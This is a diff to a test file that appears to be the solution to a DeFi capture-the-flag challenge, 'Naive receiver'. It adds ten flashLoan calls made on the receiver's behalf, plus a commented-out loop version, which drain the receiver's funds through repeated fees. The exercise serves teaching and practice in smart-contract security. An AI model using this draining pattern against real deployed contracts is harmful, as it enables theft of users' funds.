@@ -31,6 +31,36 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+        await this.pool.flashLoan(this.receiver.address,0);
+
+        // const forLoop = async _ => {
+        //     console.log('Start')
+          
+        //     for (let index = 0; index < 10; index++) {
+        //         await this.pool.flashLoan(this.receiver.address,0);
+        
+        //         const ethBalance = await ethers.provider.getBalance(this.receiver.address);
+        
+        //         console.log(ethBalance);
+  
+        //     }
+
+        //     const poolEthBalance = await ethers.provider.getBalance(this.pool.address);
+        //     console.log(poolEthBalance);
+          
+        //     console.log('End')
+        // }
+
+        // forLoop();
     });
 
     after(async function () {
